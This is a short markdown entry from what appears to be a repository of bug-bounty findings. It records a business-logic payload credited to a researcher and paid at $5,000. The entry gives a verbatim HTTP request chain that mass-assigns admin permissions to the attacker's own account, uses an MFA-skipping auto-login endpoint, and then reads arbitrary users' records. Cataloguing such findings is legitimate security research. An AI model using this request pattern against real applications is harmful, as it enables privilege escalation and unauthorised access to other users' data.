# Payloads — business-logic

_Verbatim payload / request patterns extracted from findings in this repo. Nothing invented._

## 1. Free-trial → platform superadmin via mass assignment + MFA-skipping auto-login ($5,000)
- Researcher: @infinitelogins
- Post: https://x.com/infinitelogins/status/2115429533738262954
- Sources: `posts/infinitelogins/2026-10-28-2115429533738262954.md`

```
PUT /api/admin/{my-user-id} {"admin_permissions":"0000000f"}; POST /autologin/devices {"access_key":"{my-key}"}; GET /api/users/{any-user-id}
```
